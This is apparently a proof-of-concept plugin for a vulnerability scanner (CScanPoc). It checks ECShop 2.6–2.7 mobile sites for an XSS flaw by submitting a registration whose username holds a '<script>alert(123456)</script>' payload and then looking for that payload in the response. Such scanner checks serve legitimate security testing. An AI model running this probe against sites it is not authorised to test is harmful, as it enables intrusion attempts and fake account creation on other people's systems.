# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'ecshop_0006' # 平台漏洞编号，留空
    name = 'ecshop xss漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2013-10-30'  # 漏洞公布时间
    desc = '''
        ecshop xss漏洞,2.6-2.7（开启手机商城的）.
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'ecshop'  # 漏洞应用名称
    product_version = '2.6-2.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fde03a9a-d059-43dd-9fdb-23e3aba510a7'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/mobile/user.php?act=act_register'
            url = '{target}'.format(target=self.target)+payload
            post_data = 'username=networks<script>alert(123456)</script>&email=xsstest@126.com&password=woaini&confirm_password=woaini&act=act_register&back_act='
            code, head, body, _, _ = hh.http("-d \"%s\" %s" %(post_data,url))
                       
            if code == 200:
                if body and body.find('<script>alert(123456)</script>') != -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()